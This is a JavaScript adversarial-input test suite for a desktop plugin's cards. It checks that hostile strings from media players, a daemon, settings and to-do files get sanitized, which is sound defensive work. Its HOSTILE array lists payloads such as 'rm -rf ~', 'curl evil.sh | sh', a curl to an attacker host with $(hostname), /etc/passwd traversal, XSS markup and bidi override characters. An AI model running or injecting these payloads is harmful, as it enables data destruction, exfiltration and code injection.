// Adversarial input: values written by another process that reach a card.
//
// A media player can be registered by any application on the session bus, the
// AirPods daemon is separate software, and both the to-do file and shell.json
// live in the user's home. None of it is trusted.
//
// Everything this plugin reads was written by something else: a daemon, a media
// player registered by any application on the session bus, a file the user can
// edit, a kernel interface. This file assumes all of it is hostile and checks
// that the worst an attacker gets is a wrong-looking card.
//
// The two things that must never happen: a value reaching an argument vector
// that was not on an allowlist, and a value reaching a renderer that could
// interpret it.
var t = require("./harness.js")
var Arrange = require("../model/Arrange.js")
var DateTime = require("../model/DateTime.js")
var Media = require("../model/Media.js")
var Pods = require("../model/Pods.js")
var Power = require("../model/Power.js")
var Probe = require("../model/Probe.js")
var Settings = require("../model/Settings.js")
var Sysfs = require("../model/Sysfs.js")
var Todo = require("../model/Todo.js")
var TodoList = require("../model/TodoList.js")

// Payloads that matter if a value ever reaches a shell, an argv, a path, or a
// renderer that interprets markup.
var HOSTILE = [
  "; rm -rf ~", "&& curl evil.sh | sh", "| tee /etc/passwd", "$(id)", "`id`",
  "$(curl attacker/$(hostname))", "--help", "-rf", "--exec=id", "\n/bin/sh",
  "a\u0000b", "../../etc/passwd", "/etc/shadow", "file:///etc/passwd",
  "<img src=x onerror=alert(1)>", "<a href='file:///etc/passwd'>x</a>",
  "<b>bold</b>", "&lt;script&gt;", "‮evil", "%n%n%n", "{{7*7}}",
  "__proto__", "constructor", "prototype"
]

// ------------------------------------------------ a hostile MPRIS player

// Any application on the session bus can register an MPRIS player and choose
// every string on it. None of them reaches anything but a PlainText label.
HOSTILE.forEach(function (payload) {
  var track = Media.describe({
    trackTitle: payload, trackArtist: payload, trackAlbum: payload,
    identity: payload, trackArtUrl: payload, isPlaying: true, canControl: true
  })
  t.ok(track.title.indexOf("\u0000") === -1, "a null byte never survives into a title")
  t.ok(track.title.length <= 120, "and neither does an oversized one")
})
t.eq(Media.describe({ trackTitle: new Array(100000).join("x") }).title.length, 120,
  "a hundred-kilobyte title is capped")
t.eq(Media.artUrl("javascript:alert(1)"), "", "a javascript art URL is refused")
t.eq(Media.artUrl("data:text/html;base64,PHNjcmlwdD4="), "", "so is a data URI")
t.eq(Media.artUrl("FILE:///etc/passwd"), "FILE:///etc/passwd",
  "file art is allowed — it is an image source, and the scheme check is case-insensitive")
t.eq(Media.artUrl("ftp://attacker/x"), "", "an unexpected scheme is refused")
t.eq(Media.artUrl("\u0000https://ok"), "", "a null byte before a good scheme does not smuggle it in")
t.eq(Media.artUrl(new Array(9000).join("x")), "", "and an enormous non-URL is refused outright")

// ------------------------------------------------------ a hostile daemon

// The AirPods status file is written by a separate process and named by whoever
// paired the device.
HOSTILE.forEach(function (payload) {
  var status = Pods.parse(JSON.stringify({
    schema_version: 1, device_name: payload, model_name: payload,
    left: { available: true, level: 50 }
  }))
  t.ok(status.deviceName.indexOf("\u0000") === -1, "no null byte survives a device name")
  t.ok(status.deviceName.length <= 64, "and a device name stays capped")
})
t.eq(Pods.parse('{"schema_version":1,"left":{"available":true,"level":1e308}}').left.level,
  Pods.UNKNOWN, "an absurd battery level is discarded")
t.eq(Pods.parse('{"schema_version":1,"left":{"available":true,"level":-0}}').left.level, 0,
  "negative zero is still zero per cent")
t.eq(Pods.parse('{"__proto__":{"polluted":true},"schema_version":1}').ok, true,
  "a __proto__ key in the file is just a key")
t.eq(({}).polluted, undefined, "and does not reach Object.prototype")

// -------------------------------------------------------- a hostile file

// todos.json is written by this plugin but lives in the user's home, so it can
// be edited by anything running as them.
HOSTILE.forEach(function (payload) {
  var parsed = Todo.parse(JSON.stringify({ items: [{ id: payload, text: payload, deadline: 1 }] }))
  if (parsed.items.length === 0) return
  t.ok(parsed.items[0].text.indexOf("\u0000") === -1, "no null byte survives a to-do")
  t.ok(parsed.items[0].id.length <= 40, "and an id stays short enough to be an id")
})
t.eq(Todo.parse('{"items":[{"__proto__":{"polluted":true},"text":"x"}]}').items[0].archived, false,
  "a __proto__ key on an item does not become a field")
t.eq(({}).polluted, undefined, "and does not reach Object.prototype")
// 1e308 is finite and survives a rounding, then produces an Invalid Date whose
// every accessor is NaN.
t.eq(Todo.parse('{"items":[{"text":"x","deadline":1e308}]}').items[0].deadline, 0,
  "a deadline beyond what a date can represent is no deadline")
t.eq(Todo.timestamp(Todo.MAX_DEADLINE), Todo.MAX_DEADLINE, "the last representable instant is kept")
t.eq(Todo.timestamp(Todo.MAX_DEADLINE + 1), 0, "one past it is not")
t.eq(DateTime.deadlineLabel(1e308, Date.now(), DateTime.DAY_FIRST_DASH, DateTime.HOUR_24), "",
  "and an unrepresentable date renders as nothing rather than NaN")
t.eq(DateTime.deadlineLabel(Infinity, Date.now(), DateTime.DAY_FIRST_DASH, DateTime.HOUR_24), "",
  "as does infinity")

// A file large enough to matter must not be parsed at all.
var huge = '{"items":[' + new Array(60000).join('{"text":"x"},') + '{"text":"x"}]}'
t.ok(huge.length > 700000, "the oversized fixture really is oversized")
var before = Date.now()
var parsedHuge = Todo.parse(huge)
t.ok(Date.now() - before < 1000, "an oversized to-do file is refused quickly, not parsed")
t.eq(parsedHuge.items.length, 0, "and yields nothing")

// -------------------------------------------------- hand-edited settings

HOSTILE.forEach(function (payload) {
  var s = Settings.normalize({
    position: payload, monitor: payload, preferredPlayer: payload,
    cards: [payload], dateFormat: payload, timeFormat: payload,
    intervalMs: payload, columns: payload, tileSize: payload
  })
  t.ok(Settings.POSITIONS.indexOf(s.position) !== -1, "position always ends up valid")
  t.ok(Settings.DATE_FORMATS.indexOf(s.dateFormat) !== -1, "so does the date format")
  t.ok(Settings.TIME_FORMATS.indexOf(s.timeFormat) !== -1, "and the clock")
  t.ok(s.cards.length === 0, "an unknown card id never survives")
  t.ok(s.intervalMs >= 500 && s.intervalMs <= 60000, "the sampling interval stays bounded")
  t.ok(s.monitor.indexOf("\u0000") === -1, "a monitor name carries no control characters")
})

// -------------------------------------------------------- kernel输 files

t.eq(Sysfs.parseTemperature("999999999"), Sysfs.UNKNOWN, "an impossible temperature is refused")
t.eq(Sysfs.parseTemperature("-99999999"), Sysfs.UNKNOWN, "in both directions")
t.eq(Sysfs.parseCpuStat("cpu " + new Array(200).join("1 ")).cores.length, 0,
  "a stat line with no per-cpu rows yields no cores")
var manyCores = []
for (var c = 0; c < 4096; c++) manyCores.push("cpu" + c + " 1 1 1 1 1 1 1")
t.ok(Sysfs.parseCpuStat(manyCores.join("\n")).cores.length <= Sysfs.MAX_CORES,
  "a machine claiming four thousand cores does not get four thousand bars")

// ------------------------------------------------------- the widget list

// Arranging reads ids that came from settings, which came from a file.
t.deep(Arrange.reorder(["system"], HOSTILE), ["system"],
  "a hostile drag order cannot introduce a widget that does not exist")
t.deep(Arrange.without(["system"], "__proto__"), ["system"], "nor can hiding one")
t.eq(({}).polluted, undefined, "and none of it reaches Object.prototype")
t.deep(Arrange.fromBarConfig({ layout: { left: [{ id: "__proto__" }] } }, "__proto__").id,
  "__proto__", "an entry keyed oddly is still just an entry")

// ---------------------------------------------------- reordered text

// U+202E and its relatives reorder the characters after them, so a string can
// be made to read as something other than what it is — the Trojan Source class.
// Rendering honoured it: a to-do reading "GNIHTEMOS" displayed as "SOMETHING".
var RLO = "\u202e"
var LRO = "\u202d"
t.eq(Todo.text(RLO + "GNIHTEMOS"), "GNIHTEMOS", "a to-do cannot reorder itself")
t.eq(Todo.text("safe" + LRO + "tail"), "safetail", "in either direction")
t.eq(Todo.text("a\u2066b\u2069c"), "abc", "isolates are dropped as well as overrides")
t.eq(Media.cleanText(RLO + "GNOS"), "GNOS", "and a track title cannot either")
t.eq(Pods.parse('{"schema_version":1,"device_name":"' + RLO + 'sdoPriA"}').deviceName,
  "sdoPriA", "nor can a device name chosen on someone else's phone")

process.exit(t.report("security:text"))
